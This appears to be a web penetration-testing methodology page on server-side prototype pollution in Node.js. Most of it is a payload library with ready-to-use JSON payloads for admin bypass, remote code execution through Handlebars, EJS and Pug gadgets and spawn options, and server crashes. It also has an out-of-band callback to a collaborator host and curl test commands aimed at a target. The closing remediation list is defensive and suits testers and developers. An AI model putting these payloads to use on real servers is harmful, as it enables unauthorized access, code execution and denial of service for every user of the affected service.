---
title: "Prototype Pollution (Server-Side / Node.js)"
date: 2026-02-24
draft: false
---

# Prototype Pollution (Server-Side / Node.js)

> **Severity**: Critical | **CWE**: CWE-1321
> **OWASP**: A03:2021 – Injection

---

## What Is Server-Side Prototype Pollution?

Same root cause as client-side (see 55_ProtoPollution_Client.md) but exploited in **Node.js server processes**. When user-controlled JSON/query data reaches `_.merge`, `qs.parse`, `lodash.set`, or similar functions on the server, polluting `Object.prototype` can:

- **Bypass authentication** (add `isAdmin: true` to all objects)
- **RCE** via gadget chains in template engines, child_process, spawn, or `env` variables
- **Crash the server** (DoS via `toString` or `constructor` overwrite)

Unlike client-side, impact persists **across all user sessions** until server restarts — one successful attack affects all users.

```javascript
// Vulnerable server-side code (Node.js/Express):
app.post('/settings', (req, res) => {
  const userConfig = {};
  _.merge(userConfig, req.body);  // ← user-controlled data merged
  // If req.body = {"__proto__": {"isAdmin": true}}
  // → Object.prototype.isAdmin = true
  // → Every object in this Node process inherits isAdmin: true
  if (config.isAdmin) {  // always true now
    grantAdmin();
  }
});
```

---

## Discovery Checklist

- [ ] Find endpoints accepting JSON body with deep merge/extend operations
- [ ] Test `{"__proto__": {"polluted": true}}` in JSON POST body
- [ ] Test `{"constructor": {"prototype": {"polluted": true}}}`
- [ ] Test URL query string: `?__proto__[polluted]=1`
- [ ] Test nested path: `{"a": {"__proto__": {"polluted": true}}}`
- [ ] Confirm via a harmless property — check if it propagates to response
- [ ] Look for Node.js in tech stack (Express, Koa, Fastify, NestJS, Hapi)
- [ ] Check libraries: lodash (merge/defaults/set), qs, deep-extend, merge, defaults, clone
- [ ] Test template engines: Handlebars, EJS, Pug, Nunjucks for RCE gadgets
- [ ] Test after pollution: does `{}["polluted"]` return your value in any response?
- [ ] Check `package.json` via path traversal or exposed endpoints for dependency versions

---

## Payload Library

### Payload 1 — Authentication Bypass

```json
// If app checks req.user.isAdmin or similar property:
{"__proto__": {"isAdmin": true}}
{"__proto__": {"admin": true}}
{"__proto__": {"role": "admin"}}
{"__proto__": {"authorized": true}}
{"__proto__": {"authenticated": true}}
{"__proto__": {"permissions": ["admin", "read", "write"]}}
{"__proto__": {"access_level": 9999}}

// Nested pollution:
{"settings": {"__proto__": {"isAdmin": true}}}

// Constructor path:
{"constructor": {"prototype": {"isAdmin": true}}}

// Via URL-encoded body:
__proto__[isAdmin]=true
__proto__[role]=admin
constructor[prototype][isAdmin]=true
```

### Payload 2 — RCE via Handlebars Template Engine

```bash
# Handlebars has a known gadget chain for prototype pollution → RCE:
# Pollution payload (JSON body):
{
  "__proto__": {
    "pendingContent": "{{#with \"s\" as |string|}}\n  {{#with \"e\"}}\n    {{#with split as |conslist|}}\n      {{this.pop}}\n      {{this.push (lookup string.sub \"constructor\")}}\n      {{this.pop}}\n      {{#with string.split as |codelist|}}\n        {{this.pop}}\n        {{this.push \"return require('child_process').execSync('id').toString();\"}}\n        {{this.pop}}\n        {{#each conslist}}\n          {{#with (string.sub.apply 0 codelist)}}\n            {{this}}\n          {{/with}}\n        {{/each}}\n      {{/with}}\n    {{/with}}\n  {{/with}}\n{{/with}}"
  }
}

# Simpler Handlebars RCE gadget (check version-specific PoCs):
{"__proto__": {"type": "Program", "body": [{"type": "MustacheStatement", "path": {"type": "SubExpression", "path": {"type": "PathExpression", "original": "constructor", "parts": ["constructor"]}, "params": [{"type": "StringLiteral", "value": "return process.mainModule.require('child_process').execSync('id').toString()"}]}}]}}
```

### Payload 3 — RCE via `child_process.spawn` / `fork`

```bash
# If app calls spawn/fork with options that include env from a merged config:
# Polluting NODE_OPTIONS or shell-related env vars:
{"__proto__": {"NODE_OPTIONS": "--inspect=0.0.0.0:1337"}}
{"__proto__": {"NODE_OPTIONS": "--require /proc/self/environ"}}

# Polluting `shell` option:
{"__proto__": {"shell": "node"}}

# Polluting `argv0` to change process name:
{"__proto__": {"argv0": "node"}}

# If app uses execFile with a merged options object:
# Pollution makes options.shell = true → command injection via filename
{"__proto__": {"shell": true}}
# Then filename becomes: "ls; id" → shell executes "id"
```

### Payload 4 — RCE via EJS Template Engine

```bash
# EJS < 3.1.7 prototype pollution → RCE via outputFunctionName gadget:
{
  "__proto__": {
    "outputFunctionName": "a=1;process.mainModule.require('child_process').execSync('id > /tmp/pwned');s"
  }
}

# Or via delimiter:
{
  "__proto__": {
    "delimiter": "a",
    "openDelimiter": "1;require('child_process').execSync('id');//",
    "closeDelimiter": ";"
  }
}
```

### Payload 5 — RCE via Pug Template Engine

```bash
# Pug prototype pollution gadget:
{
  "__proto__": {
    "compileDebug": true,
    "self": true,
    "line": "require('child_process').execSync('id')"
  }
}
```

### Payload 6 — Blind Detection (OOB)

```bash
# When no visible output — use OOB to confirm pollution:
{
  "__proto__": {
    "NODE_OPTIONS": "--require /proc/self/fd/0",
    "env": {
      "EVIL": "require('http').get('http://COLLABORATOR_ID.oast.pro/confirm')"
    }
  }
}

# DNS exfil via shell injection in spawn:
{
  "__proto__": {
    "shell": "/bin/bash",
    "argv0": "bash",
    "env": {"CMD": "nslookup COLLABORATOR_ID.oast.pro"}
  }
}

# Timing-based (if server process hangs when certain props polluted):
{"__proto__": {"toString": null}}  # crash
{"__proto__": {"valueOf": null}}   # crash
```

### Payload 7 — DoS via Prototype Pollution

```bash
# Pollute toString/valueOf → crash any code that calls it:
{"__proto__": {"toString": 1}}       # TypeError: toString is not a function
{"__proto__": {"constructor": 1}}    # Kills Object.constructor chain
{"__proto__": {"hasOwnProperty": 1}} # Breaks for...in loops

# Infinite loop via __defineGetter__:
{"__proto__": {"a": {"get": "b"}}}

# Memory exhaustion via polluting length:
{"__proto__": {"length": 999999999}}
```

---

## Tools

```bash
# server-side-prototype-pollution-gadgets — Gareth Heyes research:
# Reference: https://portswigger.net/research/server-side-prototype-pollution

# ppfuzz — server and client side:
git clone https://github.com/dwisiswant0/ppfuzz
ppfuzz -l urls.txt --server

# Burp Suite:
# - Send all JSON POSTs to Repeater
# - Add __proto__ key manually, check for behavior changes
# - Param Miner → Guess JSON params (includes __proto__ detection)

# DOM Invader (Burp) also does server-side detection on reflected responses

# Manual Node.js gadget check — if you have source access:
grep -rn "merge\|defaultsDeep\|_.set\|deepMerge\|clone\|assign" \
  --include="*.js" node_modules/

# Check lodash version:
cat node_modules/lodash/package.json | grep '"version"'
# Vulnerable: < 4.17.21

# Check qs version:
cat node_modules/qs/package.json | grep '"version"'
# Vulnerable: < 6.7.3

# Test server-side pollution via response observation:
# Send: {"__proto__": {"test123": "polluted"}}
# Then send any GET request → does {} have test123 in response?
curl -X POST https://target.com/api/update \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"x_polluted": "yes"}}' \
  -H "Authorization: Bearer TOKEN"

# Then check if reflected anywhere:
curl https://target.com/api/config \
  -H "Authorization: Bearer TOKEN" | grep "x_polluted"
```

---

## Remediation Reference

- **Freeze `Object.prototype`**: `Object.freeze(Object.prototype)` at application startup
- **Update lodash**: >= 4.17.21 for merge, set, defaultsDeep
- **Update qs**: >= 6.7.3 for query string parsing
- **Use `Object.create(null)`** for objects used as hash maps
- **Schema validation before merge**: use JSON Schema, Zod, or Joi — reject `__proto__`, `constructor`, `prototype` keys
- **Sanitize keys**: filter out dangerous keys before any deep merge: `if (key === '__proto__' || key === 'constructor') continue`
- **Use Map/WeakMap** instead of plain objects for attacker-controlled key-value data
- **Regular `npm audit`**: identifies prototype pollution vulnerabilities in dependencies

*Part of the Web Application Penetration Testing Methodology series.*
